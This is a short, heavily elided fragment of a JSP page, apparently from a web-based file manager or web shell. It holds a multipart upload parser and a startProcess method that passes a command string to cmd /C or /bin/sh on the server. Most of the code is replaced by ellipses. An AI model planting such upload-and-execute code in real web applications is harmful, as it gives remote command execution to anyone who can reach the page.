...
<%!
	...
	*/
	...
	public class HttpMultiPartParser {
		...
		public Hashtable processData(javax.servlet.ServletInputStream is, String boundary, String saveInDir,
	...
	static String startProcess(String command, String dir) throws IOException {
		...
		if("Windows XP".equals(System.getProperties().getProperty("os.name"))) {
			comm[0] = "cmd";
			comm[1] = "/C";
		} else {
			comm[0] = "/bin/sh";
